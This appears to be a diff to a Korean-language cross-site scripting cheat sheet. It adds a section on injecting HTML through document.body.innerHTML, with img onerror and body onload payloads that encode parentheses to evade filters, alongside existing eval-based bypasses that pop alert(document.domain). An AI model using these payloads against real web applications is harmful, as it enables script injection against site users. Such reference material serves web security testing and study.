@@ -253,3 +253,10 @@ true => !![]
         "alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};
         Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29"instanceof[];
         ```
+
+    - `document.body.innerHTML` 추가 : 문서 내 새로운 HTML 코드 추가 가능. 하지만 `<sciprt>` 태그는 삽입해도 실행 불가
+    
+        ```html
+        document.body.innerHTML+="<img src=x: onerror=alert&#40;1&#41;>";
+        document.body.innerHTML+="<body src=x: onload=alert&#40;1&#41;>";
+        ```
